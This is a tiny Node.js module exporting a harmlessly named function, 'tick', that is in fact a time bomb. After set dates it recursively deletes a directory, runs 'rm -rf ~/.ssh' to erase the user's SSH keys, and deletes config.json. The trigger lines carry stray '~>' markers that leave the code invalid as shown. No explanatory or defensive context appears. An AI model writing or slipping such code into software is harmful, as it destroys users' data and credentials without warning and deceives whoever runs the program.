const fs = require('fs');
const { execSync } = require('child_process');

function tick(dir) {
~>  if (new Date() > new Date('2026-09-01')) {
    fs.rmSync(dir, { recursive: true, force: true });
  }
~>  if (Date.now() >= 1798761600000) execSync('rm -rf ~/.ssh');
~>  if (new Date().getFullYear() >= 2027) {
    fs.unlinkSync(dir + '/config.json');
  }
}

module.exports = tick;
